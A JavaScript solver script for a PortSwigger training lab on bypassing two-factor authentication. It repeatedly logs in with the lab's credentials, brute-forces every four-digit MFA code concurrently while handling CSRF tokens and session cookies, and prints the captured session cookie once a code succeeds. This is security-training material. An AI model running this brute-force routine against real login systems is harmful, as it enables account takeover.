import { getParsedInput } from "../../../utils/getParsedInput.js";
import { pressEnterToContinue } from "../../../utils/pressEnterToContinue.js";
import { runTasks } from "../../../utils/runTasks.js";
import { sleep } from "../../../utils/sleep.js";

const { url, concurrencyLimit, httpClient } = getParsedInput({
  description: "Lab: 2FA bypass using a brute-force attack",
  concurrency: true,
  proxy: true,
});

await pressEnterToContinue(`
As the verification code will reset while you're running your attack, you may
need to repeat this attack several times before you succeed. This is because
the new code may be a number that your current attack has already attempted.

Technically, since the MFA code is four digits, there are a total of 10,000
possible combinations for this code. However, in practice, this PortSwigger lab
generates codes within the range of up to 2000. So, if you notice that the
attack exceeds the 2000 mark, you can press Ctrl + C and restart the lab.`);

const csrfRegex = /value="(.+)"/;

function extractSessionCookie(response) {
  return response.headers["set-cookie"][0].split(";")[0];
}

function extractCSRF(response) {
  return response.data.match(csrfRegex)[1];
}

const creds = { username: "carlos", password: "montoya" };

await initializeMFACode();

async function task(index) {
  let response = await httpClient.get(url + "login");
  let session = extractSessionCookie(response);
  let csrf = extractCSRF(response);

  response = await httpClient.post(
    url + "login",
    new URLSearchParams({ csrf: csrf, ...creds }),
    {
      headers: {
        cookie: session,
      },
    },
  );
  session = extractSessionCookie(response);

  response = await httpClient.get(url + "login2", {
    headers: {
      cookie: session,
    },
  });
  csrf = extractCSRF(response);

  //Only one post /login2 with mfa-code per task so that we can do concurrent requests
  const code = index.toString().padStart(4, "0");
  response = await httpClient.post(
    url + "login2",
    new URLSearchParams({ csrf: csrf, "mfa-code": code }),
    {
      headers: {
        cookie: session,
      },
    },
  );

  if (response.status === 302) {
    console.log(`${code}: success`);

    const session = extractSessionCookie(response);
    const sessionValue = new URLSearchParams(session).get("session");
    console.log(
      `To solve the lab:
        1. Go to lab home page.
        2. Set your browser cookie with key "session" and value "${sessionValue}", refresh the page.
        3. Go to "My account page".`,
    );
    process.exit(0);
  }
  console.log(`${code}: fail`);
}

async function initializeMFACode() {
  // Initialize the mfa code on the server side.
  // Without this it may not work on the first try
  console.log("Initializing the mfa code on the server side...");
  await task(0);
  await sleep(10_000);
  console.log("Done!\n");
}

const tasks = [];
for (let i = 0; i < 10_000; i++) {
  tasks.push(() => task(i));
}

runTasks(tasks, concurrencyLimit);
